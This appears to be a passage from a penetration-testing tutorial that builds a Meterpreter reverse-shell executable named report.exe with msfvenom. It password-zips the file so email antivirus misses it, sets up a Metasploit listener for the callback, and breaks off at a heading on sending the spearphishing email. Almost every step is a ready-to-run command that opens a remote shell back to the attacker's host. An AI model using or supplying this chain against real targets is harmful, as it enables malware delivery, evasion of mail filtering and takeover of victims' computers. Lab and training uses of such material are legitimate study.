Lets start by creating the malicious _report.exe_ file that we will send by using _MSFVenom_:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=2222 -f exe > report.exe`

Once that's done, move the file into the Desktop directory, and go to it:

`mv report.exe Desktop/`

We need to zip the _.exe_ file using a password-protected zip in order to bypass possible antivirus blockers of certain email providers.

`cd /home/kali/Desktop`
`zip -e report.zip report.exe`

When prompted for a password, write:
`123445`

Next, we will set up a listener in Metasploit to obtain a reverse shell when the target executes our program.
`msfconsole`

Execute the following commands to configure the exploit and payload with the correct IP address and port for the reverse connection. use exploit/multi/handler

`set payload windows/meterpreter/reverse_tcp`
`set LHOST 192.168.1.100`
`set LPORT 2222`
`exploit`

# Crafting and Sending the Spearphishing Email
